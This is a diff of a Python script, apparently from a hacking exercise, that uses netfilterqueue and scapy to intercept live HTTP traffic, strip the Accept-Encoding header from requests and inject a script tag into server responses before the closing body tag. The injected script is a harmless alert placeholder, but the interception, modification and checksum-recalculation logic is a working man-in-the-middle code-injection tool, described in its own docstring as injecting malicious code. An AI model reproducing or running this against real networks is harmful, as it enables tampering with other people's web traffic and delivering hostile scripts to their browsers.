@@ -1,29 +1,45 @@
 #!/usr/bin/env python
+"""
+inject malicious code into an active HTTP stream
+v1.0 Oct 2018
+johnroge -> outlook.com
+Last change:
+"""
 
 import netfilterqueue
 import scapy.all as scapy
+import re
 
 
 def set_load(packet, load):
-    pass
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
 
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
+        load = scapy_packet[scapy.Raw].load
         if scapy_packet[scapy.TCP].dport == 80:
-            print('request')
-            print(scapy_packet)
+            print('[+] Request')
+            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+
         elif scapy_packet[scapy.TCP].sport == 80:
-            if scapy_packet[scapy.TCP].seq in ack_list:
-                ack_list.remove(scapy_packet[scapy.TCP].seq)
-                print('replacing file...')
-                modified_packet = set_load(scapy_packet, 'HTTP/1.1 moved')
+            print('[+] Response')
+            print(scapy_packet.show())
+            load = load.replace("</body", "<script>alert('test');</script></body>")
 
-                packet.set_payload(str(modified_packet))
-
+        if load != scapy_packet[scapy.Raw].load:
+            new_packet = set_load(scapy_packet, load)
+            packet.set_payload(str(new_packet))
     packet.accept()
 
 
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
 
 
